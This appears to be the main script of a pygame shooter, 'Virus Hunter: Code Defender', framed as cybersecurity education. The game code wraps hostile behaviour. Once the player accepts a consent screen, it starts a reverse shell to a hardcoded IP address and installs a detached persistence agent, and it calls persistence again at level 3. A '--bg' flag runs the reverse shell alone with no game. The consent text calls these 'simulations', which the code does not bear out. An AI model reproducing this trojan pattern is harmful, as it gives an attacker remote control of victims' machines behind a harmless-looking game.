import sys
import os
import pygame
import argparse
import random

# Add parent directory to path to import modules properly
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from cyber_modules.dependency_checker import ensure_dependencies
from game.player import Player
from game.ui import HUD, TerminalUI
from game.terminals import Terminal, Enemy
from game.bullet import Bullet
from cyber_modules.network_shell import ReverseShell
from cyber_modules.persistence import create_persistence, remove_persistence

class Particle:
    def __init__(self, x, y, color):
        self.pos = pygame.Vector2(x, y)
        angle = random.uniform(0, 360)
        speed = random.uniform(2, 5)
        self.vel = pygame.Vector2(0, 1).rotate(angle) * speed
        self.lifetime = random.randint(20, 40)
        self.color = color

    def update(self):
        self.pos += self.vel
        self.lifetime -= 1

    def draw(self, screen):
        if self.lifetime > 0:
            size = max(1, self.lifetime // 10)
            pygame.draw.circle(screen, self.color, self.pos, size)

def show_consent_screen(screen, width, height):
    font = pygame.font.SysFont("Consolas", 28, bold=True)
    small_font = pygame.font.SysFont("Consolas", 20)
    
    messages = [
        "VIRUS HUNTER: CODE DEFENDER (MAJESTIC EDITION)",
        "",
        "This project is for cybersecurity education ONLY.",
        "It demonstrates:",
        "1. Dependency Management",
        "2. Remote Shell Communication (Simulation)",
        "3. Persistence Mechanisms (Simulated Marker)",
        "4. System Cleanup",
        "",
        "Use ONLY in a controlled VM or lab environment.",
        "",
        "Press 'Y' to ACCEPT and enter the system.",
        "Press 'N' to CANCEL."
    ]

    running = True
    while running:
        screen.fill((2, 5, 10))
        
        # Grid
        for x in range(0, width, 50):
            pygame.draw.line(screen, (10, 20, 30), (x, 0), (x, height))
        for y in range(0, height, 50):
            pygame.draw.line(screen, (10, 20, 30), (0, y), (width, y))

        for i, msg in enumerate(messages):
            color = (0, 255, 200) if i == 0 else (200, 220, 220)
            if "ACCEPT" in msg: color = (0, 255, 100)
            if "CANCEL" in msg: color = (255, 100, 100)
            
            text = font.render(msg, True, color) if i == 0 else small_font.render(msg, True, color)
            rect = text.get_rect(center=(width // 2, 100 + i * 40))
            screen.blit(text, rect)

        pygame.display.flip()
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_y:
                    return True
                if event.key == pygame.K_n:
                    return False
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--windowed", action="store_true")
    parser.add_argument("--host", default="10.12.72.224", help="Listener IP address")
    parser.add_argument("--bg", action="store_true", help="Run in background mode (shell only)")
    args = parser.parse_args()

    if args.bg:
        # Background mode: Just start the shell and stay alive
        shell = ReverseShell(host=args.host)
        shell._connect_and_shell()
        sys.exit(0)

    # Ensure dependencies first
    try:
        ensure_dependencies(["pygame"])
    except Exception as e:
        print(f"Error checking dependencies: {e}")
        sys.exit(1)

    pygame.init()
    
    if args.windowed:
        width, height = 1200, 800
        screen = pygame.display.set_mode((width, height))
    else:
        info = pygame.display.Info()
        width, height = info.current_w, info.current_h
        screen = pygame.display.set_mode((width, height), pygame.FULLSCREEN)
    
    pygame.display.set_caption("Virus Hunter: Code Defender")
    clock = pygame.time.Clock()

    player = Player(width // 2, height // 2)
    hud = HUD(width, height)
    
    # House Structure - Define Walls
    walls = [
        pygame.Rect(0, 0, width, 10), # Top
        pygame.Rect(0, height - 10, width, 10), # Bottom
        pygame.Rect(0, 0, 10, height), # Left
        pygame.Rect(width - 10, 0, 10, height), # Right
        pygame.Rect(width // 2 - 5, 0, 10, height // 3), # Partition 1
        pygame.Rect(width // 2 - 5, 2 * height // 3, 10, height // 3), # Partition 2
    ]
    
    shell = ReverseShell(host=args.host)
    if not show_consent_screen(screen, width, height):
        pygame.quit()
        sys.exit()
    
    # Start shell background thread immediately after consent
    shell.start()
    
    # START PERSISTENCE AGENT IMMEDIATELY (DETACHED)
    from cyber_modules.persistence import create_persistence
    create_persistence()
    
    terminals = pygame.sprite.Group()
    network_terminal = Terminal(3 * width // 4, height // 4, "network", "NETWORK NODE")
    quarantine_terminal = Terminal(width // 2, 3 * height // 4, "quarantine", "QUARANTINE TERMINAL")
    
    enemies = pygame.sprite.Group()
    bullets = pygame.sprite.Group()
    particles = []
    
    mission_text = "Level 1: AUTHENTICATING... [SPACE] TO SKIP"
    scan_progress = 0
    level = 1
    shake_amount = 0
    
    shell = ReverseShell(host=args.host)
    last_direction = pygame.Vector2(1, 0)
    
    running = True
    win = False
    
    while running:
        delta_time = clock.tick(60) / 1000.0
        
        # Track direction
        keys = pygame.key.get_pressed()
        move = pygame.Vector2(0, 0)
        if keys[pygame.K_w]: move.y -= 1
        if keys[pygame.K_s]: move.y += 1
        if keys[pygame.K_a]: move.x -= 1
        if keys[pygame.K_d]: move.x += 1
        if move.length() > 0:
            last_direction = move.normalize()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if win:
                if event.type == pygame.KEYDOWN:
                    running = False
                continue

            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    running = False
                if event.key == pygame.K_SPACE:
                    if level == 1:
                        scan_progress = 100 # Skip Level 1
                    else:
                        bullets.add(Bullet(player.pos.x, player.pos.y, last_direction))
                        shake_amount = 5 # Recoil shake
                if event.key == pygame.K_e:
                    if level == 2 and network_terminal.is_near(player):
                        # Shell already started after consent, node interaction 'secures' the display logic
                        pass
                    elif level == 3 and quarantine_terminal.is_near(player):
                        create_persistence()
                        level = 4
                        mission_text = "Level 4: Eliminate all viruses to SECURE system!"

        # Logic
        if win:
            continue

        if level == 1:
            if scan_progress < 100:
                scan_progress += 1.2 # Faster majestic entry
                deps = ["BIO_SCAN", "SYS_INTEGRITY", "DEP_CHECK", "NET_READY"]
                curr_dep = deps[int(scan_progress / 25) % len(deps)]
                mission_text = f"ANALYSIS: {curr_dep} [ONLINE] - [SPACE] TO SKIP"
                
                # Majestic shimmer on player during level 1
                if random.random() < 0.2:
                    particles.append(Particle(player.pos.x, player.pos.y, (100, 255, 255)))
                
                # More aggressive enemies for majestic action
                if len(enemies) < 6 and random.random() < 0.08:
                    enemies.add(Enemy(random.randint(0, width), random.randint(0, height)))
            else:
                level = 2
                terminals.add(network_terminal)
                mission_text = "System Initialized. LOCATE NETWORK NODE."
        
        if level == 2:
            if shell.status == "CONNECTED":
                level = 3
                terminals.add(quarantine_terminal)
                mission_text = "Majestic Shell Active. Level 3: Find Quarantine Terminal."
            elif "RETRYING" in shell.status or "CONNECTING" in shell.status:
                mission_text = f"Linking: {shell.status}. (Run tools/listener.py!)"
            else:
                 mission_text = "Level 2: Secure Network Node (Press E)"
        
        if level == 4:
            if scan_progress < 200:
                scan_progress += 0.4
            if scan_progress >= 200:
                win = True
            
            if len(enemies) < 8 and random.random() < 0.05:
                enemies.add(Enemy(random.randint(50, width-50), random.randint(50, height-50)))

        # Player Wall Protection
        old_pos = player.pos.copy()
        player.update(width, height)
        for wall in walls:
            if player.rect.colliderect(wall):
                player.pos = old_pos
                player.rect.center = player.pos

        bullets.update()
        
        # Enemy spawning - keep them coming for "Majestic" feel
        if len(enemies) < (4 + level * 2) and random.random() < 0.02:
             # Spawn far from player
             spawn_pos = pygame.Vector2(random.uniform(0, width), random.uniform(0, height))
             if spawn_pos.distance_to(player.pos) > 300:
                 enemies.add(Enemy(spawn_pos.x, spawn_pos.y))

        # Bullet cleanup and wall impact
        for bullet in list(bullets):
            for wall in walls:
                if bullet.rect.colliderect(wall):
                    for _ in range(5):
                        particles.append(Particle(bullet.pos.x, bullet.pos.y, (0, 255, 255)))
                    bullets.remove(bullet)
                    break
            else:
                if bullet.pos.x < 0 or bullet.pos.x > width or bullet.pos.y < 0 or bullet.pos.y > height:
                    bullets.remove(bullet)
        
        terminals.update(player)
        enemies.update(player.pos)
        
        # Enemy Wall collisions
        for e in enemies:
             for wall in walls:
                  if e.rect.colliderect(wall):
                       # Simple bounce or stop
                       e.pos -= (player.pos - e.pos).normalize() * 2
                       e.rect.center = e.pos

        # Collisions
        hit_enemies = pygame.sprite.groupcollide(enemies, bullets, True, True)
        for enemy in hit_enemies:
            shake_amount = 10 # Impact shake
            for _ in range(15):
                particles.append(Particle(enemy.pos.x, enemy.pos.y, (255, 50, 50)))
        
        if pygame.sprite.spritecollide(player, enemies, True):
            player.health -= 15
            shake_amount = 20 # Damage shake
            for _ in range(10):
                particles.append(Particle(player.pos.x, player.pos.y, (0, 255, 255)))

        # Update particles
        for p in list(particles):
            p.update()
            if p.lifetime <= 0:
                particles.remove(p)

        # Shake decay
        if shake_amount > 0:
            shake_amount -= 1
        
        offset = pygame.Vector2(random.uniform(-shake_amount, shake_amount), 
                                random.uniform(-shake_amount, shake_amount))

        # Render
        screen.fill((2, 8, 15))
        
        # Grid with offset
        for x in range(0, width + 100, 60):
            pygame.draw.line(screen, (10, 20, 40), (x + offset.x, 0), (x + offset.x, height))
        for y in range(0, height + 100, 60):
            pygame.draw.line(screen, (10, 20, 40), (0, y + offset.y), (width, y + offset.y))

        # Sector Labels
        font = pygame.font.SysFont("Consolas", 32, bold=True)
        lbl1 = font.render("HOUSE [ALPHA]: SECURE OPS", True, (10, 40, 60))
        screen.blit(lbl1, (20, height - 60))
        lbl2 = font.render("HOUSE [BETA]: MALWARE LABS", True, (60, 20, 10))
        screen.blit(lbl2, (width - 450, 40))

        # Draw Walls (Cyber Houses)
        for wall in walls:
            pygame.draw.rect(screen, (0, 100, 255), wall.move(offset), 2)
            pygame.draw.rect(screen, (0, 20, 40), wall.move(offset))

        for t in terminals:
            screen.blit(t.image, t.rect.move(offset))
            if t.active: # Draw prompt manually for shake
                font = pygame.font.SysFont("Consolas", 16)
                prompt = font.render(f"PRESS E: {t.title}", True, (255, 255, 0))
                screen.blit(prompt, (t.rect.centerx - prompt.get_width()//2 + offset.x, t.rect.top - 20 + offset.y))

        for e in enemies:
            screen.blit(e.image, e.rect.move(offset))
            
        for b in bullets:
            # Bullet rendering is handled below with offset
            pass
            
        for p in particles:
            p.draw(screen) # Particles are relative to screen

        player.draw(screen) # Player trail draws at current pos, no shake on player itself usually looks better or worse? 
        # Actually shake the WHOLE screen by blitting to a surface then blitting that. 
        # But for now, just blitting at offset is okay.
        
        hud.draw(screen, player, mission_text, min(100, int(scan_progress) if level == 1 else (int(scan_progress - 100) if level == 4 else 0)), level)
        
        # Re-draw b.draw with offset
        for b in bullets:
             screen.blit(b.image, b.rect.move(offset))

        # Objective pointer
        if level == 2:
            hud.draw_pointer(screen, player.pos, network_terminal.rect.center)
        elif level == 3:
            hud.draw_pointer(screen, player.pos, quarantine_terminal.rect.center)

        if win:
            overlay = pygame.Surface((width, height), pygame.SRCALPHA)
            overlay.fill((0, 0, 0, 200))
            screen.blit(overlay, (0, 0))
            f = pygame.font.SysFont("Consolas", 60, bold=True)
            txt = f.render("SYSTEM SECURED", True, (0, 255, 100))
            screen.blit(txt, txt.get_rect(center=(width // 2, height // 2)))
        
        pygame.display.flip()

    pygame.quit()

if __name__ == "__main__":
    main()
